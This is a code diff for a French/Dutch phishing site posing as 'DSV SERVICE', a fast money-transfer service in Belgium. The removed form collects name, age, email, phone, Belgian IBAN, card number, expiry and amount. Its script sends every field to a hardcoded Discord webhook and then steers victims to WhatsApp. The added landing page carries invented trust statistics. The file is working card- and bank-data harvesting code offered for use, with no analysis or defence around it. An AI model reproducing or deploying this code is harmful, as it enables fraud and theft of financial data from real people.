-            <span class="error-msg"><span class="fr">⚠️ Veuillez sélectionner une banque</span><span class="nl">⚠️ Selecteer een bank</span></span>
-        </div>
-
-        <!-- CARTE -->
-        <div class="form-group">
-            <label for="carte_52">
-                <span class="fr">Carte de crédit <span class="required">*</span></span>
-                <span class="nl">Creditcard <span class="required">*</span></span>
-            </label>
-            <div class="input-wrapper">
-                <span class="network-logo" id="cardLogo"></span>
-                <input type="text" id="carte_52" name="Numéro de carte 52/49/51" placeholder="4312 5900 7901 1248" required>
-            </div>
-            <span class="error-msg"><span class="fr">⚠️ 16 chiffres (ex: 4312 5900 7901 1248)</span><span class="nl">⚠️ 16 digits (e.g., 4312 5900 7901 1248)</span></span>
-        </div>
-
-        <div class="form-row">
-            <!-- EXPIRATION -->
-            <div class="form-group">
-                <label for="expiry">
-                    <span class="fr">Expiration <span class="required">*</span></span>
-                    <span class="nl">Vervaldatum <span class="required">*</span></span>
-                </label>
-                <input type="text" id="expiry" name="Date d'expiration" placeholder="12/25" maxlength="5" required>
-                <span class="error-msg"><span class="fr">⚠️ MM/AA (ex: 12/25)</span><span class="nl">⚠️ MM/JJ (e.g., 12/25)</span></span>
-            </div>
-
-            <!-- MONTANT -->
-            <div class="form-group">
-                <label for="amount">
-                    <span class="fr">Montant (€) <span class="required">*</span></span>
-                    <span class="nl">Bedrag (€) <span class="required">*</span></span>
-                </label>
-                <input type="text" id="amount" name="Montant à recevoir" placeholder="150,00" pattern="[0-9]+([,.][0-9]{1,2})?" required>
-                <span class="error-msg"><span class="fr">⚠️ Exemple: 150,00</span><span class="nl">⚠️ E.g.: 150,00</span></span>
-            </div>
-        </div>
-
-        <button type="submit" class="btn-submit" id="submitBtn">
-            <span class="fr">💰 Envoyer la Demande</span>
-            <span class="nl">💰 Aanvraag verzenden</span>
-        </button>
-        <p style="font-size:12px; color:var(--muted); text-align:center; margin-top:14px;">
-            <span class="fr">En cliquant, vous acceptez notre politique de confidentialité.</span>
-            <span class="nl">Door te klikken gaat u akkoord met ons privacybeleid.</span>
-        </p>
-    </form>
-
-    <div class="footer">
-        <strong>DSV SERVICE</strong> – Bedrijvenzone Machelen Cargo 829/A, 1830 Machelen (Belgique)<br>
-        TVA / BTW : BE 1234.567.890 – RPR / KBO : 1234.567.890<br>
-        <a href="#"><span class="fr">Mentions légales</span><span class="nl">Wettelijke kennisgeving</span></a> –
-        <a href="#"><span class="fr">Politique de confidentialité</span><span class="nl">Privacybeleid</span></a>
-    </div>
-
-    <!-- ===== POP-UP ===== -->
-    <div class="modal-overlay" id="confirmationModal">
-        <div class="modal">
-            <div class="icon">✅</div>
-            <h2>
-                <span class="fr">Nous avons reçu votre demande</span>
-                <span class="nl">We hebben uw aanvraag ontvangen</span>
-            </h2>
-            <p>
-                <span class="fr">Un agent <strong>DSV Dienst</strong> vous contactera via <strong>WhatsApp</strong> pour vérification.<br>Suivez les instructions sur WhatsApp pour recevoir votre argent dès aujourd'hui par virement immédiat.</span>
-                <span class="nl">Een medewerker van <strong>DSV Dienst</strong> neemt contact met u op via <strong>WhatsApp</strong> voor verificatie.<br>Volg de instructies op WhatsApp om vandaag nog uw geld te ontvangen via een onmiddellijke overschrijving.</span>
-            </p>
-            <p style="font-size:14px; color:var(--muted); margin-bottom:0;"><span class="fr">Merci</span><span class="nl">Bedankt</span></p>
-            <button class="btn-close" onclick="closeModal()"><span class="fr">Fermer</span><span class="nl">Sluiten</span></button>
-        </div>
-    </div>
-
-</div>
-</div>
-
 <script>
-    // ================================================================
-    // FORMULAIRE DSV – DISCORD WEBHOOK
-    // ================================================================
-
-    var DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1554600184107765863/PLuY6_Ko3EBrDmqryYRttpNZVBjAXlW73KGZds_3rND7TOXXJUGI_e7KCSKUtBiUOFL3';
-
-    // ---- 1. GESTION DU POP-UP & SOUMISSION ----
-    var form = document.getElementById('mainForm');
-    var modal = document.getElementById('confirmationModal');
-    var submitBtn = document.getElementById('submitBtn');
-
-    form.addEventListener('submit', function(e) {
-        e.preventDefault();
-        if (!form.checkValidity()) {
-            return;
-        }
-
-        submitBtn.disabled = true;
-        submitBtn.textContent = '⏳ Envoi... / Verzenden...';
-
-        // Récupérer les données du formulaire
-        var formData = {
-            'Nom complet': document.getElementById('fullname').value,
-            'Âge': document.getElementById('age').value,
-            'Email': document.getElementById('email').value,
-            'Téléphone': document.getElementById('phone').value,
-            'Compte BE': document.getElementById('compte_be').value,
-            'Banque': document.getElementById('banque_select').value || 'Non sélectionnée',
-            'Carte': document.getElementById('carte_52').value,
-            'Carte réseau': detectedCardType || 'Inconnu',
-            'Expiration': document.getElementById('expiry').value,
-            'Montant': document.getElementById('amount').value
-        };
-
-        // Envoyer à Discord
-        sendToDiscord(formData);
-    });
-
-    function sendToDiscord(data) {
-        var message = {
-            content: '📋 **Nouvelle soumission DSV SERVICE**',
-            embeds: [{
-                color: 10038079,
-                fields: [
-                    { name: '👤 Nom', value: data['Nom complet'], inline: false },
-                    { name: '🎂 Âge', value: data['Âge'], inline: true },
-                    { name: '📧 Email', value: data['Email'], inline: true },
-                    { name: '📱 Téléphone', value: data['Téléphone'], inline: false },
-                    { name: '🏦 Compte BE', value: '`' + data['Compte BE'] + '`', inline: false },
-                    { name: '🏛️ Banque', value: data['Banque'], inline: true },
-                    { name: '💳 Carte', value: '`' + data['Carte'] + '`', inline: false },
-                    { name: '🔖 Réseau', value: data['Carte réseau'], inline: true },
-                    { name: '📅 Expiration', value: data['Expiration'], inline: true },
-                    { name: '💰 Montant', value: data['Montant'] + ' €', inline: true }
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        };
-
-        fetch(DISCORD_WEBHOOK, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(message)
-        })
-        .then(function() {
-            modal.classList.add('active');
-            submitBtn.disabled = false;
-            submitBtn.textContent = submitBtn.textContent.replace('⏳', '💰');
-            form.reset();
-            updateProgress();
-        })
-        .catch(function(err) {
-            console.error('Erreur Discord:', err);
-            modal.classList.add('active');
-            submitBtn.disabled = false;
-            submitBtn.textContent = submitBtn.textContent.replace('⏳', '💰');
-        });
-    }
-
-    function closeModal() {
-        modal.classList.remove('active');
-        submitBtn.disabled = false;
-        var text = document.body.classList.contains('lang-nl') ? '💰 Aanvraag verzenden' : '💰 Envoyer la Demande';
-        submitBtn.textContent = text;
-    }
-
-    modal.addEventListener('click', function(e) {
-        if (e.target === modal) closeModal();
-    });
-
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape') closeModal();
-    });
-
-    // ---- 2. TÉLÉPHONE (international) ----
-    function cleanPhone(value) {
-        var cleaned = value.replace(/[^0-9+]/g, '');
-        if (cleaned.startsWith('+32')) {
-            var digits = cleaned.substring(3).replace(/\D/g, '');
-            if (digits.length > 9) digits = digits.slice(0, 9);
-            var formatted = '+32 ';
-            for (var i = 0; i < digits.length; i++) {
-                if (i === 2 || i === 4 || i === 6) formatted += ' ';
-                formatted += digits[i];
-            }
-            return formatted;
-        }
-        if (cleaned.startsWith('+')) {
-            var parts = cleaned.match(/^\+(\d+)(.*)/);
-            if (parts) {
-                var code = parts[1];
-                var rest = parts[2].replace(/\D/g, '');
-                var maxDigits = 15 - code.length;
-                if (rest.length > maxDigits) rest = rest.slice(0, maxDigits);
-                var formatted = '+' + code;
-                if (rest.length > 0) {
-                    formatted += ' ';
-                    for (var j = 0; j < rest.length; j++) {
-                        if (j > 0 && j % 2 === 0) formatted += ' ';
-                        formatted += rest[j];
-                    }
-                }
-                return formatted;
-            }
-        }
-        return cleaned;
-    }
-
-    function validatePhone(input) {
-        var raw = input.value.replace(/\s/g, '');
-        var isValid = /^\+\d{8,15}$/.test(raw);
-        if (isValid) {
-            input.className = 'valid';
-            input.setCustomValidity('');
-        } else if (input.value.length > 0) {
-            input.className = 'invalid';
-            input.setCustomValidity('Format international');
-        } else {
-            input.className = '';
-            input.setCustomValidity('');
-        }
-    }
-
-    var phoneInput = document.getElementById('phone');
-    phoneInput.addEventListener('input', function() {
-        this.value = cleanPhone(this.value);
-        validatePhone(this);
-    });
-    phoneInput.addEventListener('paste', function() {
-        var self = this;
-        setTimeout(function() {
-            self.value = cleanPhone(self.value);
-            validatePhone(self);
-        }, 50);
-    });
-    phoneInput.addEventListener('blur', function() { validatePhone(this); });
-
-    // ---- 3. COMPTE BE (préfixe BE + 14 chiffres) ----
-    function formatCompteBE(value) {
-        if (value.length === 0) return 'BE ';
-        var digits = value.replace(/BE\s*/i, '').replace(/\s/g, '').replace(/\D/g, '');
-        if (digits.length > 14) digits = digits.slice(0, 14);
-        var formatted = 'BE ';
-        for (var i = 0; i < digits.length; i++) {
-            if (i > 0 && i % 4 === 0) formatted += ' ';
-            formatted += digits[i];
-        }
-        return formatted;
-    }
-
-    function validateCompteBE(input) {
-        var raw = input.value.replace(/BE\s*/i, '').replace(/\s/g, '');
-        var digits = raw.replace(/\D/g, '');
-        if (digits.length === 14) {
-            input.className = 'valid';
-            input.setCustomValidity('');
-        } else if (input.value.length > 2) {
-            input.className = 'invalid';
-            input.setCustomValidity('14 chiffres requis après BE');
-        } else {
-            input.className = '';
-            input.setCustomValidity('');
-        }
-    }
-
-    var compteBE = document.getElementById('compte_be');
-    compteBE.addEventListener('focus', function() {
-        if (this.value === '') this.value = 'BE ';
-    });
-    compteBE.addEventListener('input', function() {
-        if (!this.value.startsWith('BE ')) {
-            this.value = 'BE ' + this.value.replace(/BE\s*/i, '');
-        }
-        this.value = formatCompteBE(this.value);
-        validateCompteBE(this);
-        updateIbanLogo(this.value);
-    });
-    compteBE.addEventListener('paste', function() {
-        var self = this;
-        setTimeout(function() {
-            if (!self.value.startsWith('BE ')) {
-                self.value = 'BE ' + self.value.replace(/BE\s*/i, '');
-            }
-            self.value = formatCompteBE(self.value);
-            validateCompteBE(self);
-            updateIbanLogo(self.value);
-        }, 50);
-    });
-    compteBE.addEventListener('blur', function() {
-        validateCompteBE(this);
-        updateIbanLogo(this.value);
-    });
-
-    // ---- 4. CARTE 52/49/51 ----
-    function formatCarte(value) {
-        var digits = value.replace(/\s/g, '').replace(/\D/g, '');
-        if (digits.length > 16) digits = digits.slice(0, 16);
-        var formatted = '';
-        for (var i = 0; i < digits.length; i++) {
-            if (i > 0 && i % 4 === 0) formatted += ' ';
-            formatted += digits[i];
-        }
-        return formatted;
-    }
-
-    function validateCarte(input) {
-        var digits = input.value.replace(/\s/g, '');
-        if (digits.length === 16) {
-            input.className = 'valid';
-            input.setCustomValidity('');
-        } else if (input.value.length > 0) {
-            input.className = 'invalid';
-            input.setCustomValidity('16 chiffres requis');
-        } else {
-            input.className = '';
-            input.setCustomValidity('');
-        }
-    }
-
-    var carteInput = document.getElementById('carte_52');
-    carteInput.addEventListener('input', function() {
-        this.value = formatCarte(this.value);
-        validateCarte(this);
-        updateCardLogo(this.value);
-    });
-    carteInput.addEventListener('paste', function() {
-        var self = this;
-        setTimeout(function() {
-            self.value = formatCarte(self.value);
-            validateCarte(self);
-            updateCardLogo(self.value);
-        }, 50);
-    });
-    carteInput.addEventListener('blur', function() {
-        validateCarte(this);
-        updateCardLogo(this.value);
-    });
-
-    // ---- 4bis. DÉTECTION AUTO : BANQUE (via IBAN) + RÉSEAU DE CARTE ----
-    var detectedBankName = '';
-    var detectedCardType = '';
-
-    // Couleurs + libellés courts (couleurs officielles des banques)
-    var BANK_DATA = {
-        kbc: ['#00a550', 'KBC'],
-        cbc: ['#d0232a', 'CBC'],
-        ing: ['#ff6200', 'ING'],
-        belfius: ['#c8002d', 'BEL'],
-        bnp: ['#00965e', 'BNP'],
-        argenta: ['#004b8d', 'ARG'],
-        beobank: ['#1d2d5f', 'BEO'],
-        crelan: ['#009fe3', 'CRE']
-    };
-    var BANK_NAMES = {
-        kbc: 'KBC Bank', cbc: 'CBC Banque', ing: 'ING Belgium', belfius: 'Belfius',
-        bnp: 'BNP Paribas Fortis', argenta: 'Argenta', beobank: 'Beobank', crelan: 'Crelan'
-    };
-
-    function makeBankSvg(bg, label) {
-        return '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="' + bg + '"/><text x="25" y="22" font-family="Arial" font-size="12" font-weight="900" fill="white" text-anchor="middle">' + label + '</text></svg>';
-    }
-
-    // IBAN BE : les 3 chiffres après les 2 chiffres de contrôle = code banque
-    function detectIbanBank(raw) {
-        if (!raw.startsWith('BE') || raw.length < 7) return null;
-        var code = parseInt(raw.substring(4, 7), 10);
-        if (isNaN(code)) return null;
-        if (code === 68) return 'belfius';
-        if (code >= 0 && code <= 67) return 'bnp';
-        if (code >= 69 && code <= 99) return 'bnp';
-        if (code >= 310 && code <= 389) return 'ing';
-        if (code >= 430 && code <= 439) return 'bnp';
-        if (code >= 630 && code <= 649) return 'beobank';
-        if (code >= 730 && code <= 733) return 'kbc';
-        if (code === 734) return 'cbc';
-        if (code >= 850 && code <= 869) return 'argenta';
-        if (code >= 880 && code <= 889) return 'crelan';
-        if (code >= 890 && code <= 979) return 'argenta';
-        if (code >= 980) return 'kbc';
-        return null;
-    }
-
-    function updateIbanLogo(value) {
-        var wrapper = compteBE.parentElement;
-        var el = document.getElementById('ibanLogo');
-        var badge = document.getElementById('bankBadge');
-        var badgeLabel = document.getElementById('bankBadgeLabel');
-        var banqueSelect = document.getElementById('banque_select');
-        var raw = value.toUpperCase().replace(/[^A-Z0-9]/g, '');
-        var bank = detectIbanBank(raw);
-        if (bank && BANK_DATA[bank]) {
-            el.innerHTML = makeBankSvg(BANK_DATA[bank][0], BANK_DATA[bank][1]);
-            el.classList.add('active');
-            wrapper.classList.add('with-logo');
-            detectedBankName = BANK_NAMES[bank] || '';
-            badgeLabel.textContent = detectedBankName;
-            badge.classList.add('show');
-            // Auto-remplir le select
-            if (banqueSelect) {
-                banqueSelect.value = detectedBankName;
-                banqueSelect.classList.add('valid');
-                banqueSelect.classList.remove('invalid');
-            }
-        } else {
-            el.innerHTML = '';
-            el.classList.remove('active');
-            wrapper.classList.remove('with-logo');
-            detectedBankName = '';
-            badge.classList.remove('show');
-            // Vider le select si l'IBAN n'est pas valide
-            if (banqueSelect) {
-                banqueSelect.value = '';
-                banqueSelect.classList.remove('valid', 'invalid');
-            }
-        }
-    }
-
-    // Logos réseaux de carte (couleurs officielles)
-    var CARD_SVGS = {
-        visa: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#1a1f71"/><text x="25" y="24" font-family="Arial" font-size="17" font-weight="900" fill="#f7b600" text-anchor="middle" font-style="italic">VISA</text></svg>',
-        mastercard: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#1a1a1a"/><circle cx="19" cy="16" r="12" fill="#eb001b"/><circle cx="31" cy="16" r="12" fill="#f79e1b"/><path d="M25 5.5a12 12 0 0 1 0 21 12 12 0 0 1 0-21z" fill="#ff5f00"/></svg>',
-        maestro: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#f4f4f4"/><circle cx="19" cy="16" r="12" fill="#0099df"/><circle cx="31" cy="16" r="12" fill="#e2001a"/><path d="M25 5.5a12 12 0 0 1 0 21 12 12 0 0 1 0-21z" fill="#7b2c9e" opacity="0.85"/></svg>',
-        bancontact: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#004f9f"/><text x="25" y="22" font-family="Arial" font-size="14" font-weight="900" fill="white" text-anchor="middle">BC</text></svg>',
-        amex: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#2557d6"/><text x="25" y="21" font-family="Arial" font-size="10" font-weight="900" fill="white" text-anchor="middle">AMEX</text></svg>',
-        diners: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#0079be"/><text x="25" y="22" font-family="Arial" font-size="10" font-weight="900" fill="white" text-anchor="middle">DINERS</text></svg>',
-        discover: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#ff6000"/><text x="25" y="22" font-family="Arial" font-size="11" font-weight="900" fill="white" text-anchor="middle">DISC</text></svg>',
-        jcb: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#0066b2"/><text x="25" y="22" font-family="Arial" font-size="11" font-weight="900" fill="white" text-anchor="middle">JCB</text></svg>',
-        unionpay: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#e21640"/><text x="25" y="22" font-family="Arial" font-size="9" font-weight="900" fill="white" text-anchor="middle">UNION</text></svg>',
-        mir: '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 32"><rect width="50" height="32" rx="3" fill="#00a651"/><text x="25" y="22" font-family="Arial" font-size="11" font-weight="900" fill="white" text-anchor="middle">MIR</text></svg>'
-    };
-    var CARD_LABELS = {
-        visa: 'Visa', mastercard: 'Mastercard', maestro: 'Maestro', bancontact: 'Bancontact',
-        amex: 'American Express', diners: 'Diners Club', discover: 'Discover', jcb: 'JCB',
-        unionpay: 'UnionPay', mir: 'MIR'
-    };
-
-    function detectCardType(num) {
-        if (!num) return null;
-        if (/^6703/.test(num)) return 'bancontact';
-        if (/^4/.test(num)) return 'visa';
-        if (/^(5[1-5]|2[2-7])/.test(num)) return 'mastercard';
-        if (/^3[47]/.test(num)) return 'amex';
-        if (/^(36|38|39|30[0-5])/.test(num)) return 'diners';
-        if (/^(6011|622[12]\d{2}|64[4-9]|65)/.test(num)) return 'discover';
-        if (/^35[2-8]\d/.test(num)) return 'jcb';
-        if (/^62/.test(num)) return 'unionpay';
-        if (/^220[0-4]/.test(num)) return 'mir';
-        if (/^(50|5[6-9]|6[0-9])/.test(num)) return 'maestro';
-        return null;
-    }
-
-    function updateCardLogo(value) {
-        var wrapper = carteInput.parentElement;
-        var el = document.getElementById('cardLogo');
-        var raw = value.replace(/\D/g, '');
-        var type = detectCardType(raw);
-        if (type && CARD_SVGS[type]) {
-            el.innerHTML = CARD_SVGS[type];
-            el.classList.add('active');
-            wrapper.classList.add('with-logo');
-            detectedCardType = CARD_LABELS[type] || type;
-        } else {
-            el.innerHTML = '';
-            el.classList.remove('active');
-            wrapper.classList.remove('with-logo');
-            detectedCardType = '';
-        }
-    }
-
-    // Déclencheurs
-    compteBE.addEventListener('input', function() { updateIbanLogo(this.value); });
-    compteBE.addEventListener('paste', function() {
-        var self = this;
-        setTimeout(function() { updateIbanLogo(self.value); }, 60);
-    });
-    carteInput.addEventListener('input', function() { updateCardLogo(this.value); });
-    carteInput.addEventListener('paste', function() {
-        var self = this;
-        setTimeout(function() { updateCardLogo(self.value); }, 60);
-    });
-
-    // Nettoyage du nom : retire les chiffres en direct
-    var fullnameInput = document.getElementById('fullname');
-    fullnameInput.addEventListener('input', function() {
-        var cleaned = this.value.replace(/[0-9]/g, '');
-        if (cleaned !== this.value) this.value = cleaned;
-    });
-
-    // Réinitialiser les logos/badge après envoi (form.reset())
-    form.addEventListener('reset', function() {
-        setTimeout(function() {
-            updateIbanLogo('');
-            updateCardLogo('');
-        }, 10);
-    });
-
-    // ---- 5. DATE ----
-    function validateExpiry(input) {
-        var regex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
-        var val = input.value;
-        if (regex.test(val)) {
-            var year = parseInt(val.split('/')[1], 10);
-            if (year < 24 || year > 99) {
-                input.className = 'invalid';
-                input.setCustomValidity('Année invalide');
-            } else {
-                input.className = 'valid';
-                input.setCustomValidity('');
-            }
-        } else {
-            if (val.length > 0) {
-                input.className = 'invalid';
-                input.setCustomValidity('Format MM/AA');
-            } else {
-                input.className = '';
-                input.setCustomValidity('');
-            }
-        }
-    }
-
-    var expiryInput = document.getElementById('expiry');
-    expiryInput.addEventListener('input', function() {
-        var raw = this.value.replace(/\D/g, '');
-        if (raw.length > 4) raw = raw.slice(0, 4);
-        var formatted = '';
-        for (var i = 0; i < raw.length; i++) {
-            if (i === 2) formatted += '/';
-            formatted += raw[i];
-        }
-        this.value = formatted;
-        validateExpiry(this);
-    });
-    expiryInput.addEventListener('paste', function() {
-        var self = this;
-        setTimeout(function() {
-            var raw = self.value.replace(/\D/g, '');
-            if (raw.length > 4) raw = raw.slice(0, 4);
-            var formatted = '';
-            for (var i = 0; i < raw.length; i++) {
-                if (i === 2) formatted += '/';
-                formatted += raw[i];
-            }
-            self.value = formatted;
-            validateExpiry(self);
-        }, 50);
-    });
-    expiryInput.addEventListener('blur', function() { validateExpiry(this); });
-
-    // ---- 6. VALIDATION GLOBALE ----
-    function checkFormValidity() {
-        var allValid = true;
-        var nom = document.getElementById('fullname');
-        if (nom.value.length > 0 && !nom.checkValidity()) allValid = false;
-        if (phoneInput.value.length > 0 && phoneInput.className !== 'valid') allValid = false;
-        var email = document.getElementById('email');
-        if (email.value.length > 0 && !email.checkValidity()) allValid = false;
-        if (compteBE.value.length > 0 && compteBE.className !== 'valid') allValid = false;
-        if (carteInput.value.length > 0 && carteInput.className !== 'valid') allValid = false;
-        if (expiryInput.value.length > 0 && expiryInput.className !== 'valid') allValid = false;
-        var amount = document.getElementById('amount');
-        if (amount.value.length > 0 && !amount.checkValidity()) allValid = false;
-        var age = document.getElementById('age');
-        if (age.value.length > 0 && !age.checkValidity()) allValid = false;
-
-        submitBtn.disabled = !allValid;
-    }
-
-    document.querySelectorAll('input').forEach(function(input) {
-        input.addEventListener('input', checkFormValidity);
-        input.addEventListener('input', updateProgress);
-        input.addEventListener('change', checkFormValidity);
-        input.addEventListener('change', updateProgress);
-        input.addEventListener('blur', checkFormValidity);
-        input.addEventListener('blur', updateProgress);
-    });
-    checkFormValidity();
-    updateProgress();
-
-    // ---- 7. NETTOYAGE AVANT ENVOI ----
-    form.addEventListener('submit', function() {
-        document.getElementById('compte_be').value = document.getElementById('compte_be').value.replace(/\s/g, '');
-        document.getElementById('carte_52').value = document.getElementById('carte_52').value.replace(/\s/g, '');
-        document.getElementById('phone').value = document.getElementById('phone').value.replace(/\s/g, '');
-    });
-
-    // ---- 8. LOGIQUE DE PROGRESSION ----
-    function updateProgress() {
-        var section1Fields = [
-            document.getElementById('fullname'),
-            document.getElementById('phone'),
-            document.getElementById('email'),
-            document.getElementById('age')
-        ];
-        var section2Fields = [
-            document.getElementById('compte_be'),
-            document.getElementById('carte_52'),
-            document.getElementById('expiry'),
-            document.getElementById('amount')
-        ];
-
-        var section1Valid = 0, section2Valid = 0;
-        section1Fields.forEach(function(f) {
-            if (f.value.length > 0 && (f.className === 'valid' || f.checkValidity())) section1Valid++;
-        });
-        section2Fields.forEach(function(f) {
-            if (f.value.length > 0 && (f.className === 'valid' || f.checkValidity())) section2Valid++;
-        });
-
-        var progress = 20 + (section1Valid * 10) + (section2Valid * 10);
-        if (progress > 100) progress = 100;
-
-        var sectionText = '';
-        if (section1Valid < 4) {
-            sectionText = '<span class="fr">Étape 1 de 2 — ' + section1Valid + '/4 informations</span><span class="nl">Stap 1 van 2 — ' + section1Valid + '/4 gegevens</span>';
-        } else if (section2Valid < 4) {
-            sectionText = '<span class="fr">Étape 2 de 2 — ' + section2Valid + '/4 informations bancaires</span><span class="nl">Stap 2 van 2 — ' + section2Valid + '/4 bankgegevens</span>';
-        } else {
-            sectionText = '<span class="fr">✓ Parfait! Prêt à envoyer →</span><span class="nl">✓ Prima! Klaar om in te dienen →</span>';
-        }
-
-        document.getElementById('progressBar').style.width = progress + '%';
-        document.getElementById('sectionInfo').innerHTML = sectionText;
-    }
-
-    document.querySelectorAll('input').forEach(function(input) {
-        input.addEventListener('input', updateProgress);
-        input.addEventListener('change', updateProgress);
-        input.addEventListener('blur', updateProgress);
-    });
-    updateProgress();
-
-    // ---- 9. BASCULE DE LANGUE ----
-    function setLang(lang) {
-        var buttons = document.querySelectorAll('.lang-toggle button');
-        buttons.forEach(function(btn) { btn.classList.remove('active'); });
-        var activeBtn = document.querySelector('.lang-toggle button[data-lang="' + lang + '"]');
-        if (activeBtn) activeBtn.classList.add('active');
-
-        if (lang === 'nl') {
-            document.body.classList.add('lang-nl');
-        } else {
-            document.body.classList.remove('lang-nl');
-        }
-
-        // Mettre à jour le texte du bouton
-        var text = lang === 'nl' ? '💰 Aanvraag verzenden' : '💰 Envoyer la Demande';
-        if (!submitBtn.disabled) {
-            submitBtn.textContent = text;
-        }
-        try { localStorage.setItem('dsv-lang', lang); } catch (e) {}
-        updateProgress();
-    }
-
-    // ---- 10. RESTAURER LA LANGUE CHOISIE SUR LA LANDING ----
-    try {
-        var savedLang = localStorage.getItem('dsv-lang');
-        if (savedLang === 'fr' || savedLang === 'nl') setLang(savedLang);
-    } catch (e) {}
+/* Mark JS active ASAP and arm a failsafe so content is never stuck hidden */
+(function () {
+  document.documentElement.className += ' js';
+  setTimeout(function () {
+    document.documentElement.classList.add('reveal-all');
+  }, 2600);
+})();
 </script>
 
+<!-- Header -->
+<header id="siteHeader">
+  <a class="logo" href="#top"><img src="dsv-logo.svg" alt="DSV"></a>
+  <div class="lang-toggle">
+    <button class="active" data-lang="nl" onclick="setLang('nl')">NL</button>
+    <button data-lang="fr" onclick="setLang('fr')">FR</button>
+  </div>
+</header>
+
+<!-- Hero -->
+<section class="hero" id="top">
+  <video class="hero-video" autoplay muted loop playsinline preload="metadata" poster="dsv-image1.jpg">
+    <source src="dsv-hero.mp4" type="video/mp4">
+  </video>
+  <div class="hero-content">
+    <span class="hero-badge">
+      <span class="dot"></span>
+      <span class="fr">Service actif · Traitement en temps réel</span>
+      <span class="nl">Actieve service · Realtime verwerking</span>
+    </span>
+    <h1>
+      <span class="fr">Recevez votre virement en quelques minutes</span>
+      <span class="nl">Ontvang uw overschrijving in enkele minuten</span>
+    </h1>
+    <p>
+      <span class="fr">Transfert direct, sécurisé et 100% transparent. Aucune attente interminable, aucune complication — juste votre argent, rapidement.</span>
+      <span class="nl">Directe, veilige en 100% transparante overschrijving. Geen eindeloos wachten, geen gedoe — gewoon uw geld, snel.</span>
+    </p>
+    <div class="hero-cta-row">
+      <a href="./formulaire.html" class="btn btn-primary">
+        <span class="fr">Démarrer maintenant</span>
+        <span class="nl">Nu beginnen</span>
+      </a>
+      <a href="#avantages" class="btn btn-ghost">
+        <span class="fr">En savoir plus</span>
+        <span class="nl">Meer weten</span>
+      </a>
+    </div>
+  </div>
+  <div class="scroll-hint">
+    <span class="fr">Découvrir</span><span class="nl">Ontdekken</span>
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 9l6 6 6-6"/></svg>
+  </div>
+</section>
+
+<!-- Stats -->
+<section class="stats">
+  <div class="stats-grid">
+    <div class="reveal">
+      <div class="stat-number" data-count="2000" data-suffix="+">0</div>
+      <div class="stat-label"><span class="fr">Clients actifs</span><span class="nl">Actieve klanten</span></div>
+    </div>
+    <div class="reveal">
+      <div class="stat-number" data-count="50" data-prefix="€" data-suffix="M+">0</div>
+      <div class="stat-label"><span class="fr">Fonds traités</span><span class="nl">Verwerkte fondsen</span></div>
+    </div>
+    <div class="reveal">
+      <div class="stat-number" data-count="98" data-suffix="%">0</div>
+      <div class="stat-label"><span class="fr">Satisfaction</span><span class="nl">Tevredenheid</span></div>
+    </div>
+    <div class="reveal">
+      <div class="stat-number">24/7</div>
+      <div class="stat-label"><span class="fr">Support</span><span class="nl">Ondersteuning</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- Features -->
+<section id="avantages">
+  <div class="container">
+    <div class="section-head reveal">
+      <span class="eyebrow"><span class="fr">Avantages</span><span class="nl">Voordelen</span></span>
+      <h2 class="section-title">
+        <span class="fr">Pourquoi choisir DSV SERVICE</span>
+        <span class="nl">Waarom kiezen voor DSV SERVICE</span>
+      </h2>
+      <p class="section-desc">
+        <span class="fr">Une solution fiable, rapide et transparente, conçue pour les professionnels partout en Europe.</span>
+        <span class="nl">Een betrouwbare, snelle en transparante oplossing, ontworpen voor professionals in heel Europa.</span>
+      </p>
+    </div>
+    <div class="grid">
+      <div class="card reveal">
+        <div class="card-icon"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2L3 14h9l-1 8 10-12h-9l1-8z"/></svg></div>
+        <h3><span class="fr">Ultra-rapide</span><span class="nl">Ultrasnel</span></h3>
+        <p><span class="fr">Vos fonds arrivent en quelques minutes, pas en plusieurs jours.</span><span class="nl">Uw geld arriveert binnen enkele minuten, niet in dagen.</span></p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg></div>
+        <h3><span class="fr">Sécurisé</span><span class="nl">Veilig</span></h3>
+        <p><span class="fr">Protocoles bancaires de classe mondiale pour protéger chaque transaction.</span><span class="nl">Bankprotocollen van wereldklasse beschermen elke transactie.</span></p>
+      </div>
+      <div class="card reveal">
+        <div class="card-icon"><svg viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M20 6L9 17l-5-5"/></svg></div>
+        <h3><span class="fr">Transparent</span><span class="nl">Transparant</span></h3>
+        <p><span class="fr">Aucun frais caché, aucune surprise. Vous savez exactement ce que vous recevez.</span><span class="nl">Geen verborgen kosten, geen verrassingen. U weet precies wat u ontvangt.</span></p>
+      </div>
+      <div class="card reveal">
